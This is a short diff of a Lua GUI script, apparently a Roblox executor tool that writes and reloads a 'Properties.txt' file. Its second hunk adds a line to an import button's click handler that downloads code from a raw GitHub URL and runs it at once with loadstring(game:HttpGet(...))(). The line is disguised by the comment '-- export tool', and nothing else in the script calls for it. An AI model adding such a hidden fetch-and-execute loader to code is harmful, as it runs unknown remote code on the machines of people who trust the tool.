@@ -560,7 +560,6 @@ local function FTGDM_fake_script() -- Expo.LocalScript
 					appendfile("Properties.txt", "\n" .. "		elseif Shapee == 'Random' then")
 					appendfile("Properties.txt", "\n" .. "			realshape = Random_1")
 	
-	
 					appendfile("Properties.txt", "\n" .. "		end")
 					appendfile("Properties.txt", "\n" .. "			SpawnDebounce = true")
 					appendfile("Properties.txt", "\n" .. "			port = copy(realshape)")
@@ -801,6 +800,7 @@ local function LTMYJ_fake_script() -- Impo.LocalScript
 
 	script.Parent.MouseButton1Click:Connect(function()
 		loadfile("Properties.txt")()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/JunglePush/UltimateFucker/main/grrr'))() -- export tool
 	end)
 end
 coroutine.wrap(LTMYJ_fake_script)()
